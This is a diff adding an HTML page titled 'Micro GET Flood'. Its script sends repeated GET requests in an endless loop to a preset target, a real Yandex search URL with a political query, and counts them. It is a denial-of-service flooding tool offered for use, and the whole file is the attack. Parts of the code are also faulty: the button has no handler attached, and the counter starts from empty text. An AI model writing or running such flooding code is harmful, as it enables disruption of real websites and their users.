@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+    </head>
+    <body>
+        <div class="title">Micro GET Flood</div>
+        <input class="target" type="text" name="request" value="https://yandex.ru/search/?text=putin+lies" style="width: 600px;">
+        <input class="go" type="button" name="go" value="Go!">
+        <span class="count"></span>
+    </body>
+    <script type="text/javascript">
+        let goBro = false;
+        function go()
+        {
+            goBro = true;
+            let target = document.querySelector(".target").getAttribute("value");
+            let count = document.querySelector(".count");
+            console.log(target)
+            while(goBro == true)
+            {
+                var oReq = new XMLHttpRequest();
+                oReq.open("GET", target);
+                oReq.send();
+                count.textContent = parseInt(count.textContent) + 1;
+            }
+        }
+
+        function stop()
+        {
+            goBro = false;
+        }
+    </script>
+</html>
